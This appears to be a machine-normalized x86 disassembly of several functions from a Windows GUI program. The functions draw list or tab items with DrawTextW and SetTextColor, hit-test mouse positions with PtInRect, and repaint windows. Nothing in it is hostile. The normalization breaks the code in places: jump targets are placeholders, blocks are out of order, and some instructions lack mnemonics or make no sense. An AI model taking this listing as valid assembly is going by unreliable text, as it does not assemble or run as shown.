mov eax [ edx + 0x54 ]
push esi
call eax
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x26c ] eax
sub_438410
push ebp
mov ebp esp
push 0xffffffff
push sub_445831
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ esi + 0x24c ]
sub eax [ esi + 0x248 ]
mov [ ebp - 0x10 ] 0x0
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ esi + 0x24c ]
mov ebx [ esi + 0x248 ]
cmp ebx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push ebx
call [ memmove@IAT ]
add esp 0xc
add edi ebx
mov [ esi + 0x24c ] edi
mov ecx [ esi + 0x248 ]
mov edx [ ebp - 0x10 ]
mov esi [ ecx + edx * 4 ]
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
sub ecx eax
sar ecx 0x2
xor ebx ebx
test ecx ecx
je r-xdata
mov ecx [ esi + 0x2c ]
mov edi [ esi + 0x28 ]
cmp edi ecx
je r-xdata
mov edi [ eax + ebx * 4 ]
mov [ ebp - 0x18 ] edi
test edi edi
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add esp 0xc
add ebx edi
mov [ esi + 0x2c ] ebx
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
sub ecx eax
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
or ecx ecx
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
push edi
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor eax eax
or ecx 0xffffffff
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
push esi
call [ operator delete@IAT ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x24c ]
sub edx [ ecx + 0x248 ]
mov eax [ ebp - 0x10 ]
inc eax
sar edx 0x2
add esp 0x4
mov [ ebp - 0x10 ] eax
mov esi ecx
cmp eax edx
jb r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4385d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
mov ebx ecx
cmp [ ebx + 0x114 ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x118 ] 0x0
je r-xdata
mov eax [ ebx - 0x124 ]
mov edx [ ebx - 0x11c ]
mov ecx [ ebx - 0x120 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx - 0x118 ]
mov [ esp + 0x20 ] edx
mov edx [ ebx + 0xf8 ]
mov [ esp + 0x24 ] eax
mov eax [ ebx + 0xf4 ]
sub edx eax
mov [ esp + 0x1c ] ecx
xor ecx ecx
sar edx 0x2
mov [ esp + 0x10 ] ecx
test edx edx
je r-xdata
mov edi [ ebx + 0xf8 ]
sub edi [ ebx + 0xf4 ]
sar edi 0x2
dec edi
cmp edi ecx
jle r-xdata
nop
mov edx [ ebx + 0xf4 ]
mov esi [ edx + edi * 4 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov [ esi + 0xc ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0xf8 ]
sub eax [ ebx + 0xf4 ]
sar eax 0x2
lea ecx [ eax - 0x1 ]
cmp edi ecx
je r-xdata
mov ecx [ edi + 0x10 ]
add ecx [ ebx + 0x114 ]
lea eax [ ebx - 0x154 ]
mov [ edi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
mov esi edi
call sub_4387e0
cmp [ edi + 0x20 ] 0x0
jne r-xdata
mov eax [ ebx + 0x114 ]
inc eax
imul eax ecx
add [ edi + 0x10 ] eax
mov eax [ esi + 0x18 ]
sub eax [ ebx + 0x114 ]
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
lea eax [ ebx - 0x154 ]
push eax
call sub_4387e0
dec edi
cmp edi [ esp + 0x10 ]
jg r-xdata
mov edx [ ebx + 0x114 ]
sub eax edi
dec eax
inc edx
imul eax edx
sub [ esi + 0x18 ] eax
mov edx [ edi + 0x2c ]
sub edx [ edi + 0x28 ]
mov eax [ esp + 0x1c ]
mov ecx [ edi + 0x18 ]
mov [ esp + 0x2c ] eax
xor eax eax
sar edx 0x2
mov [ esp + 0x2c ] ecx
mov [ esp + 0x14 ] eax
test edx edx
je r-xdata
mov eax [ ebx + 0xf4 ]
mov edx [ ebx + 0xf8 ]
mov ecx [ esp + 0x10 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ esp + 0x10 ] ecx
cmp ecx edx
jb r-xdata
mov ecx [ esp + 0x10 ]
jmp r-xdata
mov edi [ eax + ecx * 4 ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov [ edi + 0xc ] eax
mov eax [ esp + 0x20 ]
mov [ edi + 0x10 ] edx
mov edx [ esp + 0x24 ]
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] edx
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ edi + 0x28 ]
mov esi [ ecx + eax * 4 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x2c ]
mov [ esi + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
mov ecx [ esp + 0x24 ]
mov [ esi + 0x1c ] ecx
test eax eax
je r-xdata
mov edx [ esi + 0x14 ]
add edx [ ebx + 0x118 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebx - 0x154 ]
push eax
mov [ esi + 0x1c ] edx
call sub_438a30
mov ecx [ edi + 0x2c ]
sub ecx [ edi + 0x28 ]
mov eax [ esp + 0x14 ]
inc eax
sar ecx 0x2
mov [ esp + 0x14 ] eax
cmp eax ecx
jb r-xdata
mov ecx [ ebx + 0x118 ]
inc ecx
imul ecx eax
add [ esi + 0x14 ] ecx
mov eax [ esp + 0x14 ]
sub_4387e0
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x5c ]
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x5c ] 0x0
call sub_414260
mov eax [ ebp - 0x60 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov edi edx
shr edi 0x1f
add edi edx
cmp [ esi + 0x20 ] 0x0
mov [ ebp - 0x5c ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x2
je r-xdata
mov [ ebp - 0x5c ] 0x2
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
push ecx
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov eax edx
shr eax 0x1f
add eax edx
mov ecx eax
imul ecx [ ebp - 0x5c ]
add eax ecx
mov [ ebp - 0x70 ] eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax 0x55555556
imul edi
mov eax [ esi + 0xc ]
mov edi edx
mov [ ebp - 0x18 ] eax
shr edi 0x1f
add edi edx
mov edx [ esi + 0x10 ]
mov [ ebp - 0x14 ] edx
mov edx [ esi + 0x14 ]
add eax edi
mov [ ebp - 0x10 ] edx
mov edx [ esi + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x74 ] 0x0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x70 ]
add ecx edi
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x40 ] ecx
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ eax + 0x4 ]
movzx eax [ ecx + 0xa9 ]
push eax
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x18 ]
push eax
push ecx
mov ecx ebx
call edx
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x6c ]
mov edx [ esi + 0xc ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x30 ] eax
sub eax edi
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] ecx
mov ecx [ esi + 0x18 ]
sub eax edi
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebx ]
mov ecx [ eax + 0x4 ]
movzx eax [ ecx + 0xa9 ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x18 ]
push eax
push ecx
mov ecx ebx
call edx
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x14 ]
sub eax edi
sub ecx edi
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x28 ] edx
mov edx [ esi + 0x18 ]
mov [ ebp - 0x10 ] ecx
add eax edi
mov edi [ ebp - 0x68 ]
push 0x0
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
lea edx [ ebp - 0x18 ]
push edx
push edi
mov ecx ebx
call eax
mov edx [ ebp - 0x64 ]
mov eax [ edx + 0x4 ]
mov ecx [ edi + 0x8 ]
mov eax [ eax + 0x80 ]
mov edi [ ecx ]
mov ebx [ SetTextColor@IAT ]
push eax
push edi
call ebx
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x60 ] eax
mov eax [ esi + 0xc ]
push 0x24
mov [ ebp - 0x50 ] edx
add eax 0xf
lea edx [ ebp - 0x58 ]
push edx
mov [ ebp - 0x58 ] eax
mov eax [ esi + 0x8 ]
push 0xffffffff
mov [ ebp - 0x54 ] ecx
mov ecx [ esi + 0x18 ]
push eax
push edi
mov [ ebp - 0x4c ] ecx
call [ DrawTextW@IAT ]
mov ecx [ ebp - 0x60 ]
push ecx
push edi
call ebx
mov [ ebp - 0x5c ] 0x1
sub_438a30
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x74 ] ecx
mov ecx [ ecx + 0x8 ]
mov edx [ ecx ]
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x70 ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x6c ]
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x7c ] edx
mov [ ebp - 0x6c ] 0x1
call sub_414260
mov eax [ ebp - 0x78 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
push ecx
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov eax [ esi + 0x20 ]
mov edi edx
shr edi 0x1f
add edi edx
mov [ ebp - 0x6c ] 0x0
test al 0x1
je r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
push ecx
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov eax edx
shr eax 0x1f
add eax edx
mov ecx eax
imul ecx [ ebp - 0x6c ]
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax 0x55555556
imul edi
mov eax [ esi + 0x10 ]
mov edi edx
mov [ ebp - 0x18 ] eax
shr edi 0x1f
add edi edx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x14 ] edx
mov edx [ esi + 0x18 ]
add eax edi
mov [ ebp - 0x10 ] edx
mov edx [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x20 ]
add ecx edi
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x30 ] ecx
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
mov [ ebp - 0x78 ] ecx
mov ecx [ eax + 0x4 ]
movzx eax [ ecx + 0xa9 ]
push eax
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx [ ebp - 0x74 ]
lea eax [ ebp - 0x18 ]
push eax
push ecx
mov ecx ebx
call edx
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x1c ]
mov edx [ esi + 0x10 ]
mov [ ebp - 0x48 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x40 ] eax
sub eax edi
mov [ ebp - 0x48 ] eax
mov eax [ esi + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x3c ] ecx
mov ecx [ esi + 0x1c ]
sub eax edi
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebx ]
mov ecx [ eax + 0x4 ]
movzx eax [ ecx + 0xa9 ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x74 ]
lea eax [ ebp - 0x18 ]
push eax
push ecx
mov ecx ebx
call edx
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] ecx
mov ecx [ esi + 0x14 ]
xor eax eax
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x20 ]
sub eax edi
sub ecx edi
mov [ ebp - 0x58 ] edx
mov edx [ esi + 0x1c ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x50 ] eax
mov eax [ esi + 0x10 ]
push 0x0
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0x58 ]
push ecx
mov ecx [ ebp - 0x74 ]
add eax edi
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx ebx
call edx
cmp [ esi + 0xc ] 0xffffffff
mov ebx 0xf
je r-xdata
mov [ ebp - 0x6c ] 0x1
mov eax [ ebp - 0x70 ]
mov ecx [ esi + 0x20 ]
mov edi [ eax + 0x4 ]
mov eax [ edi + 0x80 ]
test cl 0x1
je r-xdata
mov edi [ esi + 0x24 ]
test edi edi
je r-xdata
test cl 0x2
je r-xdata
mov eax [ edi + 0x84 ]
jmp r-xdata
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x70 ]
mov ebx [ edx + 0x270 ]
sub eax ebx
sub eax ecx
cdq
sub eax edx
sar eax 0x1
add ecx eax
lea eax [ ebx + ecx ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0xf
mov [ ebp - 0x18 ] eax
add ebx eax
xor eax eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x24 ] eax
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0x10 ]
mov edi [ ebp - 0x70 ]
mov ecx [ edi + 0x270 ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0xc ]
imul eax ecx
add ecx eax
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
mov edx [ edx + 0x1c ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x74 ]
push eax
call edx
mov ebx [ edi + 0x270 ]
add ebx 0x13
mov edi [ ebp - 0x7c ]
push eax
push edi
call [ SetTextColor@IAT ]
mov edx [ esi + 0x18 ]
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x7c ] eax
mov eax [ esi + 0x10 ]
push 0x24
mov [ ebp - 0x60 ] edx
add eax ebx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] eax
mov eax [ esi + 0x8 ]
push 0xffffffff
mov [ ebp - 0x64 ] ecx
mov ecx [ esi + 0x1c ]
push eax
push edi
mov [ ebp - 0x5c ] ecx
call [ DrawTextW@IAT ]
mov ecx [ ebp - 0x7c ]
push ecx
push edi
call [ SetTextColor@IAT ]
mov eax [ edi + 0x88 ]
sub_438d50
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov edx [ eax + 0x74 ]
call edx
test al al
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push eax
push esi
push ecx
mov ecx edi
call sub_418fb0
cmp esi 0x5
jne r-xdata
cmp esi 0x2a3
jne r-xdata
mov edx ebx
shr edx 0x10
movsx ecx dx
mov edx [ edi ]
mov edx [ edx + 0xb4 ]
movsx eax bx
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx edi
call edx
cmp [ edi + 0x27 ] 0x0
je r-xdata
call sub_4390d0
cmp esi 0x200
je r-xdata
mov eax [ edi + 0x24c ]
sub eax [ edi + 0x248 ]
test eax 0xfffffffc
je r-xdata
cmp esi 0x201
jne r-xdata
cmp esi 0x200
jne r-xdata
cmp esi 0x201
jne r-xdata
mov eax ebx
call sub_438e20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax ebx
mov ecx edi
call sub_4391d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_438e20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
movsx ecx ax
shr eax 0x10
movsx edx ax
mov eax [ edi + 0x258 ]
push ebx
push esi
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] edx
test eax eax
je r-xdata
mov eax [ edi + 0x258 ]
test eax eax
je r-xdata
push edx
add eax 0xc
push ecx
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x24c ]
sub eax [ edi + 0x248 ]
xor ebx ebx
sar eax 0x2
test eax eax
je r-xdata
test [ eax + 0x1c ] 0x2
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x260 ]
test eax eax
je r-xdata
jmp r-xdata
and [ eax + 0x1c ] 0xfffffffd
mov esi [ edi + 0x258 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_4387e0
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov eax [ edi + 0x260 ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
add eax 0x10
push edx
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x248 ]
mov edx [ esp + 0xc ]
mov esi [ ecx + ebx * 4 ]
mov eax [ esp + 0x8 ]
push edx
push eax
lea ecx [ esi + 0xc ]
push ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x258 ] 0x0
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov eax [ edi + 0x25c ]
mov ecx [ eax + 0x2c ]
sub ecx [ eax + 0x28 ]
xor esi esi
sar ecx 0x2
test ecx ecx
je r-xdata
test [ eax + 0x20 ] 0x2
je r-xdata
mov edx [ edi + 0x24c ]
sub edx [ edi + 0x248 ]
inc ebx
sar edx 0x2
cmp ebx edx
jb r-xdata
mov [ edi + 0x258 ] esi
or [ esi + 0x1c ] 0x2
mov esi [ edi + 0x258 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_4387e0
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov eax [ edi + 0x258 ]
mov ecx [ edi + 0x15c ]
push 0x0
add eax 0xc
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
jmp r-xdata
and [ eax + 0x20 ] 0xfffffffd
mov esi [ edi + 0x260 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov edx [ edi + 0x25c ]
mov eax [ edx + 0x28 ]
mov ecx [ esp + 0xc ]
mov ebx [ eax + esi * 4 ]
mov edx [ esp + 0x8 ]
push ecx
push edx
lea eax [ ebx + 0x10 ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov [ edi + 0x260 ] 0x0
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov edx [ edi + 0x258 ]
mov eax [ edi + 0x15c ]
push 0x0
add edx 0xc
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ edi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
mov edx [ edi + 0x25c ]
mov [ edi + 0x260 ] ebx
mov [ edx + 0x4 ] esi
or [ ebx + 0x20 ] 0x2
mov esi [ edi + 0x260 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov eax [ edi + 0x25c ]
mov ecx [ eax + 0x2c ]
sub ecx [ eax + 0x28 ]
inc esi
sar ecx 0x2
cmp esi ecx
jb r-xdata
mov eax [ edi + 0x260 ]
mov ecx [ edi + 0x15c ]
push 0x0
add eax 0x10
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x260 ]
mov ecx [ edi + 0x15c ]
push 0x0
add eax 0x10
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
sub_4390d0
push ecx
mov eax [ edi + 0x25c ]
push ebx
xor ebx ebx
push esi
mov [ edi + 0x260 ] ebx
cmp eax ebx
je r-xdata
mov eax [ edi + 0x258 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x2c ]
sub ecx [ eax + 0x28 ]
sar ecx 0x2
test ecx ecx
je r-xdata
pop esi
pop ebx
pop ecx
retn
test [ eax + 0x1c ] 0x2
je r-xdata
mov edx [ edi + 0x25c ]
mov eax [ edx + 0x28 ]
mov esi [ eax + ebx * 4 ]
test esi esi
je r-xdata
and [ eax + 0x1c ] 0xfffffffd
mov esi [ edi + 0x258 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_4387e0
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov eax [ edi + 0x25c ]
mov ecx [ eax + 0x2c ]
sub ecx [ eax + 0x28 ]
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x20 ]
test al 0x2
je r-xdata
mov [ edi + 0x258 ] 0x0
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
and eax 0xfffffffd
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov edx [ edi + 0x258 ]
mov eax [ edi + 0x15c ]
push 0x0
add edx 0xc
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ edi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov ecx [ edi + 0x15c ]
push 0x0
add esi 0x10
push esi
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
sub_4391d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
movsx esi ax
shr eax 0x10
push edi
mov edi ecx
movsx ebx ax
mov eax [ edi + 0x258 ]
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebx
test eax eax
je r-xdata
mov ecx [ edi + 0x24c ]
sub ecx [ edi + 0x248 ]
xor eax eax
sar ecx 0x2
mov [ esp + 0xc ] eax
test ecx ecx
je r-xdata
push ebx
add eax 0xc
push esi
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x260 ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov eax [ edi + 0x258 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
add eax 0x10
push esi
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov edx [ edi + 0x24c ]
sub edx [ edi + 0x248 ]
mov eax [ esp + 0xc ]
inc eax
sar edx 0x2
mov [ esp + 0xc ] eax
cmp eax edx
jb r-xdata
lea ebx [ ebx ]
mov ecx [ edi + 0x25c ]
mov [ ecx + 0x20 ] 0x0
mov edx [ edi + 0x258 ]
mov [ edx + 0x20 ] 0x1
cmp [ edi + 0x260 ] 0x0
mov eax [ edi + 0x258 ]
mov [ edi + 0x25c ] eax
jne r-xdata
mov eax [ edi + 0x260 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov edx [ edi + 0x248 ]
mov ebx [ edx + eax * 4 ]
mov edx [ ebx + 0x28 ]
mov eax [ ebx + 0x2c ]
sub eax edx
sar eax 0x2
xor ecx ecx
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
and [ esi + 0x20 ] 0xfffffffe
cmp [ ebx + 0x20 ] 0x0
je r-xdata
inc ecx
add edx 0x4
cmp ecx eax
jb r-xdata
cmp [ edi + 0x1a0 ] 0x0
lea edx [ edi + 0x154 ]
je r-xdata
call sub_4393f0
mov [ edi + 0x264 ] eax
